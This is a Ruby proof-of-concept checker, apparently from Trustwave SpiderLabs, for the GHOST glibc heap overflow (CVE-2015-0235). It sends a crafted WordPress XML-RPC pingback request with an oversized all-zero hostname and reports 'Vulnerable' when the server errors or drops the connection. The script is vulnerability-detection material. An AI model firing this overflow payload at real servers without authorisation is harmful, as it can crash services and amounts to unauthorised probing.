#
# --[ Trustwave SpiderLabs Research Team ]--
# Ref: http://blog.spiderlabs.com/2015/01/ghost-gethostbyname-heap-overflow-in-glibc-cve-2015-0235.html 
#
require "net/http"
require "uri"

if ARGV.count != 2
  puts "Usage: #{ARGV[0]} [Target URL] [count]"
  exit
end

matched = ARGV[0].match(/(?<domain>[^\/]*)(?<path>\/.*)(\/xmlrpc.php)?/)
uri = URI.parse("http://#{matched[:domain]}")
ghost_host = "0"*ARGV[1].to_i

# Set up POST request
payload = <<_EOF_
<?xml version="1.0"?>
  <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param><value>
          <string>http://#{ghost_host}/index.php</string>
    </value></param>
    <param><value>
      <string>http://#{ghost_host}/index.php</string>
    </value></param>
    </params>
  </methodCall>
_EOF_

begin
  Net::HTTP.start(uri.host, uri.port) do |http|
    response = http.post("#{matched[:path]}/xmlrpc.php", payload)
    if response.code == "500"
      puts "Vulnerable"
    else
      puts "Looks like you're safe, for today"
    end
  end 
rescue EOFError
  puts "Vulnerable"
end
#source : https://gist.github.com/rcbarnett/7564bee9f81aba746e04